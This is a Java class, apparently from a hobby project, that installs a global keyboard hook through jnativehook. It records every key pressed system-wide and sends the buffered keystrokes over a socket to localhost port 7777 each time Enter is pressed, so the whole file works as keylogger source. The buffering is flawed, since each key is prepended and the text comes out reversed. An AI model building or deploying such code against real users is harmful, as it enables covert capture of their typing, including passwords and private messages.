package org.kl;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

/**
 *
 * @author ameer
 */
public class MyKeyListener implements MyNativeKeyListener {
	
    private PrintWriter printer;
    private Socket socket;
    private String message = new String(); 
    
    public MyKeyListener() {
    	try {
    	socket = new Socket("localhost", 7777);
    	printer = new PrintWriter(socket.getOutputStream(), true);
    	}
    	catch(UnknownHostException exc1)
    	{
    		exc1.printStackTrace();
    	}
    	catch(IOException exc2)
    	{
    		exc2.printStackTrace();
    	}
    	
    }
    
    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        String str = NativeKeyEvent.getKeyText(e.getKeyCode());
        message = str + message;
        System.out.println(message);
        if ((e.getKeyCode() == NativeKeyEvent.VC_ENTER)){
        	printer.println(message); //What is connection is closed from bullshit data I get?
        	message = new String();
        }
    }

    /* Key Released */
   public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        //System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

	public void returnNativeKeyPressed(NativeKeyEvent e) {
		System.out.println("HOT");
		
	}
}
